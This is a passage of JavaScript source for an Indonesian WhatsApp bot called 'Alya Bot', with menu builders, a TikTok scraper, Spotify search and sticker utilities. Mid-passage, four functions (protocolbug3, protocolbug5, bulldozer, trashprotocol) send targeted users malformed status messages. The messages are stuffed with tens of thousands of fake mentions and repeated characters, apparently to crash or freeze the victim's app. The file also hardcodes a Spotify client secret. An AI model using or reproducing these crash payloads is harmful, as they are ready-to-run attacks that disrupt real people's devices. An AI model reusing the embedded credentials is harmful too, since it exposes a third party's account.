      return { status: false, result: "An error occurred! Server down." };
    }
  }
  async function translateText(text, sourceLang = 'id', targetLang = 'en') {
    const encodedText = encodeURIComponent(text);
    const url = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=${sourceLang}&tl=${targetLang}&dt=t&q=${encodedText}`;
    try {
      const { data } = await axios.get(url);
      return data[0][0][0];
    } catch (error) {
      throw new Error("Translation error: " + error.message);
    }
  }

  m.reply('Processing the image. Please wait a moment.');
  try {
    const translatedText = await translateText(text, 'id', 'en');
    const response = await text2img(translatedText);
    if (response.status) {
      await alya.sendMessage(m.chat, { 
        image: { url: response.result },
      }, { quoted: m });
    } else {
      m.reply(`Failed to generate image: ${response.result}`);
    }
  } catch (error) {
    m.reply('An error occurred while processing your request.');
  }
}
async function AlyaTTDL(videoUrl) {
  try {
    const endpoint = "https://ssstik.io/abc?url=dl";
    const requestData = new URLSearchParams({
      id: videoUrl,
      locale: "id",
      tt: "VktkdWY4",
    });
    const headers = {
      "HX-Request": "true",
      "HX-Trigger": "_gcaptcha_pt",
      "HX-Target": "target",
      "HX-Current-URL": "https://ssstik.io/id",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    };
    const response = await axios.post(endpoint, requestData.toString(), { headers });
    const $ = cheerio.load(response.data);
    const title = $("h2").text().trim() || "Judul tidak tersedia";
    const description = $(".maintext").text().trim() || "Deskripsi tidak tersedia";
    const downloadLink = $(".download_link.without_watermark").attr("href") || null;
    const hdDownloadLink = $(".download_link.without_watermark_hd").attr("href") || null;

    return {
      title,
      description,
      downloadLink,
      hdDownloadLink,
    };
  } catch (error) {
    console.error("Error saat scraping:", error.message);
    return { error: error.message };
  }
}
async function listbut2(chat, teks, listnye, jm) {


const moment = require('moment-timezone')
const greetHour = moment.tz('Asia/Jakarta').hours()
const greetText = greetHour < 12 ? 'Selamat Pagi ☀️' : greetHour < 15 ? 'Selamat Siang 🌤️' : greetHour < 18 ? 'Selamat Sore 🌅' : 'Selamat Malam 🌙'


const menuButtons = [
  {
    
    name: "single_select",
    buttonParamsJson: JSON.stringify(listnye)
  },
  {
    
    name: "cta_url",
    buttonParamsJson: JSON.stringify({
      display_text: "📲 Hubungi Owner",
      url: `https://wa.me/${ownernomer}`,
      merchant_url: `https://wa.me/${ownernomer}`
    })
  },
  {
    
    name: "quick_reply",
    buttonParamsJson: JSON.stringify({ display_text: "📦 Semua Fitur", id: `${prefix}allmenu` })
  },
  {
    
    name: "quick_reply",
    buttonParamsJson: JSON.stringify({ display_text: "💎 Info Premium", id: `${prefix}infoprem` })
  }
]


let mediaHeader
try {
  
  const videoPaths = [
    './media/menu.mp4', './media/video/menu.mp4', './media/video/alya.mp4',
    './data/assets/menu.mp4', './data/video/menu.mp4', './data/assets/video/menu.mp4'
  ]
  let vidBuf = global._menuMp4Buffer
  if (!vidBuf) {
    for (const p of videoPaths) {
      if (fs.existsSync(p)) { vidBuf = fs.readFileSync(p); break }
    }
  }
  if (!vidBuf) throw new Error('no video, try image')
  if (!global._menuMp4Buffer) global._menuMp4Buffer = vidBuf
  
  mediaHeader = proto.Message.InteractiveMessage.Header.create({
    title: '',
    gifPlayback: false,
    hasMediaAttachment: true,
    ...(await prepareWAMessageMedia(
      { video: vidBuf, gifPlayback: false },
      { upload: alya.waUploadToServer }
    ))
  })
} catch {
  try {
    
    const imgPaths = ['./data/image/menu.jpg', './media/alya.jpg', './media/alya/alya1.jpg']
    let imgBuf = null
    for (const p of imgPaths) {
      if (fs.existsSync(p)) { imgBuf = fs.readFileSync(p); break }
    }
    if (!imgBuf) throw new Error('no image, try text')
    mediaHeader = proto.Message.InteractiveMessage.Header.create({
      title: '',
      subtitle: '',
      hasMediaAttachment: true,
      ...(await prepareWAMessageMedia(
        { image: imgBuf },
        { upload: alya.waUploadToServer }
      ))
    })
  } catch {
    
    mediaHeader = proto.Message.InteractiveMessage.Header.create({
      title: `🌸 ${global.botname || 'Alya Bot'}`,
      hasMediaAttachment: false
    })
  }
}


const fkontak = {
  key: { participant: '0@s.whatsapp.net', remoteJid: 'status@broadcast' },
  message: {
    contactMessage: {
      displayName: global.ownername || 'Owner',
      vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${global.ownername || 'Owner'}\nEND:VCARD`,
      sendEphemeral: true
    }
  }
}
const quotedMsg = jm || fkontak

const msg = generateWAMessageFromContent(chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 9,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: global.channel,
            newsletterName: global.channeln,
            serverMessageId: 127
          }
        },
        body: proto.Message.InteractiveMessage.Body.create({
          text: teks
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: `Pilih tombol di bawah untuk info lebih lanjut\n💡 Prefix saat ini: ${getPrefixDisplay()}`
        }),
        header: mediaHeader,
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          messageParamsJson: JSON.stringify({
            limited_time_offer: {
              text: greetText,
              url: `https://wa.me/${ownernomer}`,
              copy_code: `${global.botname || 'Alya Bot'} by ${ownername}`,
              expiration_time: Date.now() + 1000000
            },
            bottom_sheet: {
              in_thread_buttons_limit: 2,
              divider_indices: [1, 2, 3, 4, 5, 999],
              list_title: 'Silahkan pilih menu yang kamu inginkan',
              button_title: '🌸 Selengkapnya'
            },
            tap_target_configuration: {
              title: ' X ',
              description: `${global.botname || 'Alya Bot'}`,
              canonical_url: `https://wa.me/${ownernomer}`,
              domain: 'alya.bot',
              button_index: 0
            }
          }),
          buttons: menuButtons
        })
      })
    }
  }
}, { quoted: quotedMsg })
await alya.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}




async function listbut3(chat, teks, listnye, jm, opts = {}) {
  const moment = require('moment-timezone')
  const greetHour = moment.tz('Asia/Jakarta').hours()
  const greetText = greetHour < 12 ? 'Selamat Pagi ☀️' : greetHour < 15 ? 'Selamat Siang 🌤️' : greetHour < 18 ? 'Selamat Sore 🌅' : 'Selamat Malam 🌙'
  
  
  const subBackButtons = [
    {
      
      name: "single_select",
      buttonParamsJson: JSON.stringify(listnye)
    },
    {
      
      name: "cta_url",
      buttonParamsJson: JSON.stringify({
        display_text: "📲 Hubungi Owner",
        url: `https://wa.me/${ownernomer}`,
        merchant_url: `https://wa.me/${ownernomer}`
      })
    },
    {
      
      name: "quick_reply",
      buttonParamsJson: JSON.stringify({ display_text: "🏠 Menu Utama", id: `${prefix}menu` })
    },
    {
      
      name: "quick_reply",
      buttonParamsJson: JSON.stringify({ display_text: "📦 Semua Fitur", id: `${prefix}allmenu` })
    }
  ]

  
  let mediaHeader
  try {
    const videoPaths = [
      './media/menu.mp4', './media/video/menu.mp4', './media/video/alya.mp4',
      './data/assets/menu.mp4', './data/video/menu.mp4', './data/assets/video/menu.mp4'
    ]
    let vidBuf = global._menuMp4Buffer
    if (!vidBuf) {
      for (const p of videoPaths) {
        if (fs.existsSync(p)) { vidBuf = fs.readFileSync(p); break }
      }
    }
    if (!vidBuf) throw new Error('no video, try image')
    if (!global._menuMp4Buffer) global._menuMp4Buffer = vidBuf
    
    mediaHeader = proto.Message.InteractiveMessage.Header.create({
      title: ``,
      gifPlayback: false,
      hasMediaAttachment: true,
      ...(await prepareWAMessageMedia(
        { video: vidBuf, gifPlayback: false },
        { upload: alya.waUploadToServer }
      ))
    })
  } catch {
    try {
      const imgPaths = ['./data/image/menu.jpg', './media/alya.jpg', './media/alya/alya1.jpg']
      let imgBuf = null
      for (const p of imgPaths) {
        if (fs.existsSync(p)) { imgBuf = fs.readFileSync(p); break }
      }
      if (!imgBuf) throw new Error('no image, try text')
      mediaHeader = proto.Message.InteractiveMessage.Header.create({
        title: ``,
        subtitle: ``,
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia(
          { image: imgBuf },
          { upload: alya.waUploadToServer }
        ))
      })
    } catch {
      mediaHeader = proto.Message.InteractiveMessage.Header.create({
        title: opts.title || `🌸 Alya Bot`,
        hasMediaAttachment: false
      })
    }
  }

  const msg = generateWAMessageFromContent(chat, {
    viewOnceMessage: {
      message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 9,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: global.channel,
              newsletterName: global.channeln,
              serverMessageId: 127
            }
          },
          body: proto.Message.InteractiveMessage.Body.create({
            text: teks
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `Pilih tombol dibawah untuk info lebih lanjut\n💡 Prefix saat ini: ${getPrefixDisplay()}`
          }),
          header: mediaHeader,
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: greetText,
                url: `https://wa.me/${ownernomer}`,
                copy_code: `Alya Bot v20 by ${ownername}`,
                expiration_time: Date.now() + 1000000
              },
              bottom_sheet: {
                in_thread_buttons_limit: 2,
                divider_indices: [1, 2, 3, 4, 5, 999],
                list_title: "Silahkan pilih menu yang kamu inginkan",
                button_title: "🌸 Selengkapnya"
              },
              tap_target_configuration: {
                title: " X ",
                description: "Alya V20",
                canonical_url: `https://wa.me/${ownernomer}`,
                domain: "alya.bot",
                button_index: 0
              }
            }),
            buttons: subBackButtons
          })
        })
      }
    }
  }, { quoted: jm })
  await alya.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
  })
}

async function uploadwidipe(filePath) {
const FormData = require("form-data");
const mime = require("mime-types");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
    try {
        if (!fs.existsSync(filePath)) throw new Error("File tidak ditemukan");
        const contentType = mime.lookup(filePath) || "application/octet-stream";
        const fileName = path.basename(filePath);
        const ext = path.extname(filePath).toLowerCase();
        const form = new FormData();
        form.append("files[]", fs.createReadStream(filePath), {
            contentType,
            filename: fileName, 
        });
        const response = await axios.post("https://qu.ax/upload.php", form, {
            headers: {
                ...form.getHeaders(),
            },
        });

        
        if (!response.data.success || !response.data.files?.length) throw new Error("Upload gagal");
        
        return response.data.files[0].url;
    } catch (err) {
        console.error("Error:", err.message);
        return null;
    }
}
async function generateAndSendCertificate(recipientName, achievementText) {
  let createCanvas, loadImage;
  try { ({ createCanvas, loadImage } = require('canvas')); } catch { return null; }
  const width = 1000;
  const height = 700;
  const canvas = createCanvas(width, height);
  const ctx = canvas.getContext('2d');
  const backgroundUrl = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQMXesWUGxIerARGsveu1mOdGdXM0icRcBLtSA-L5UNSdUaRjEYRez9ngnc&s=10';
  try {
    const background = await loadImage(backgroundUrl);
    ctx.drawImage(background, 0, 0, width, height);
  } catch (error) {
    console.error("Error loading background image:", error);
    ctx.fillStyle = '#f8f8f8';
    ctx.fillRect(0, 0, width, height);
  }
  const gradient = ctx.createLinearGradient(0, 0, 0, height);
  gradient.addColorStop(0, 'rgba(255,255,255,0.3)');
  gradient.addColorStop(1, 'rgba(255,255,255,0.7)');
  ctx.fillStyle = gradient;
  ctx.fillRect(0, 0, width, height);
  function drawRoundedRect(ctx, x, y, width, height, radius) {
    ctx.beginPath();
    ctx.moveTo(x + radius, y);
    ctx.lineTo(x + width - radius, y);
    ctx.quadraticCurveTo(x + width, y, x + width, y + radius);
    ctx.lineTo(x + width, y + height - radius);
    ctx.quadraticCurveTo(x + width, y + height, x + width - radius, y + height);
    ctx.lineTo(x + radius, y + height);
    ctx.quadraticCurveTo(x, y + height, x, y + height - radius);
    ctx.lineTo(x, y + radius);
    ctx.quadraticCurveTo(x, y, x + radius, y);
    ctx.closePath();
  }
  ctx.lineWidth = 8;
  const borderGradient = ctx.createLinearGradient(0, 0, width, height);
  borderGradient.addColorStop(0, '#ff7f50');
  borderGradient.addColorStop(1, '#ff1493');
  ctx.strokeStyle = borderGradient;
  drawRoundedRect(ctx, 10, 10, width - 20, height - 20, 30);
  ctx.stroke();
  ctx.shadowColor = 'rgba(0,0,0,0.3)';
  ctx.shadowBlur = 10;
  ctx.shadowOffsetX = 2;
  ctx.shadowOffsetY = 2;
  ctx.fillStyle = '#333';
  ctx.font = 'bold 50px Georgia';
  ctx.textAlign = 'center';
  ctx.fillText('SERTIFIKAT SIFAT', width / 2, 120);
  ctx.shadowColor = 'transparent';
  ctx.font = 'italic 30px Georgia';
  ctx.fillStyle = '#555';
  ctx.fillText('Presented To', width / 2, 180);
  ctx.font = 'bold 40px Georgia';
  ctx.fillStyle = '#000';
  ctx.fillText(recipientName, width / 2, 260);
  ctx.font = '30px Georgia';
  ctx.fillStyle = '#333';
  ctx.fillText(achievementText, width / 2, 330);
  ctx.strokeStyle = '#ff1493';
  ctx.lineWidth = 3;
  ctx.beginPath();
  ctx.moveTo(width / 4, 360);
  ctx.lineTo(width * 3 / 4, 360);
  ctx.stroke();
  const today = new Date();
  ctx.font = '20px Georgia';
  ctx.textAlign = 'right';
  ctx.fillStyle = '#000';
  ctx.fillText(`Tanggal: ${today.toLocaleDateString()}`, width - 40, height - 40);
  ctx.font = '24px Georgia';
  ctx.textAlign = 'left';
  ctx.fillText('Alya chan - Offc', 50, height - 50);
  const buffer = canvas.toBuffer('image/png');
  alya.sendMessage(
    m.chat,
    {
      image: buffer,
      caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${recipientName}`
    },
    { quoted: m }
  );
}




async function AlyaAI(pushname, text, m_obj, from_obj, sender_obj, alya_obj) {
  
  try {
    await runAIInteractive({
      body: text,
      m: m_obj || m,
      alya: alya_obj || alya,
      from: from_obj || from,
      sender: sender_obj || sender,
      pushname: pushname,
      isGroup: (m_obj || m).isGroup
    });
  } catch(e) {
    console.error('[AlyaAI V11 Error]', e.message);
  }
}
let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}
alya.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
};
async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await alya.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await alya.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
    }
async function protocolbug5(isTarget, mention) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Tama Ryuichi" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥‌𝗬𝗨‌𝗜‌𝗖‌‌‌𝗛‌𝗜‌ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await alya.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await alya.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await alya.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function trashprotocol(target, mention) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 2000000)}@s.whatsapp.net`
        )
    ];
const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        annotations: [],
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k="
    };
const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});
await alya.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });
if (mention) {
        await alya.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
if (process.env.NODE_ENV !== 'production') console.log(chalk.green(`Send Bug By Extorditcv-Pro🐉 : ${target}`));
}
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
alya.sendImageAsSticker = async (jid, media, m, options = {}) => {
    let { Sticker, StickerTypes } = require('wa-sticker-formatter')
    const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
    let jancok = new Sticker(media, {
        pack: global.packname, 
        author: global.author, 
        type: StickerTypes.FULL, 
        categories: ['🤩', '🎉'], 
        id: '12345', 
        quality: 50, 
        background: '#FFFFFF00' 
    })
    let stok = getRandom(".webp")
    let nono = await jancok.toFile(stok)
    let nah = fs.readFileSync(nono)
    await alya.sendMessage(jid,{sticker: nah},{quoted: m})
    return await fs.unlinkSync(stok)
     }

const sendvn = (teks) => {
alya.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
async function getAccessToken() {
    try {
        const client_id = 'eafbc7b558274975be58df0026f22260';
        const client_secret = '79f20d1353954c968fda33a00aba5235';
        const basic = Buffer.from(`${client_id}:${client_secret}`).toString("base64");
        const response = await axios.post('https://accounts.spotify.com/api/token', 'grant_type=client_credentials', {
            headers: {
                Authorization: `Basic ${basic}`,
                'Content-Type': 'application/x-www-form-urlencoded',
            },
        });
        const data = response.data;
        return data.access_token;
    } catch (error) {
        console.error('Error getting Spotify access token:', error);
        throw 'An error occurred while obtaining Spotify access token.';
    }
}
async function spotifydl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      const { data } = await axios.get(`https://api.siputzx.my.id/api/d/spotifyv2?url=${encodeURIComponent(url)}`);

      if (!data.status || !data.data) {
        return reject(new Error("Gagal mengambil data dari API"));
      }

      const result = {
        title: data.data.title,
        description: data.data.description,
        songTitle: data.data.songTitle,
        artist: data.data.artist,
        coverImage: data.data.coverImage,
        mp3DownloadLink: data.data.mp3DownloadLink,
        coverDownloadLink: data.data.coverDownloadLink
      };

      resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
async function searchSpotify(query) {
    try {
        const access_token = await getAccessToken();
        const response = await axios.get(`https://api.spotify.com/v1/search?q=${query}&type=track&limit=10`, {
            headers: {
                Authorization: `Bearer ${access_token}`,
            },
        });
        const data = response.data;
        const tracks = data.tracks.items.map(item => ({
            name: item.name,
            artists: item.artists.map(artist => artist.name).join(', '),
            popularity: item.popularity,
            link: item.external_urls.spotify,
            image: item.album.images[0].url,
            duration_ms: item.duration_ms,
        }));
        return tracks;
    } catch (error) {
        console.error('Error searching Spotify:', error);
        throw 'An error occurred while searching for songs on Spotify.';
    }
}
for (let BhosdikaXeon of AlyaVoiceNote) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./data/assets/audio/${BhosdikaXeon}.mp3`)
alya.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of AlyaSticker){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./data/AlyaMedia/sticker/${BhosdikaXeon}.webp`)
